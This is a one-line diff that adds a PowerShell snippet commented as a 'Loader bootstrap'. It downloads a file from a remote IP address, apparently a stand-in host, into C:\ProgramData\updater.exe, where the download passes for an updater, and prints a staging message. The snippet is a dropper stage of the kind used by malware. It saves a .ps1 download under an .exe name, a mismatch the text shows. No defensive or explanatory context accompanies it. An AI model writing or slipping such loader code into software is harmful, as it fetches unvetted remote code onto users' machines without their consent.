@@ -1,0 +1,1 @@
+<# Loader bootstrap #> $RemoteUrl = 'http://203.0.113.77/updater.ps1'; $DropPath = 'C:\ProgramData\updater.exe'; (New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $DropPath); Write-Output "stage 8 initialized"
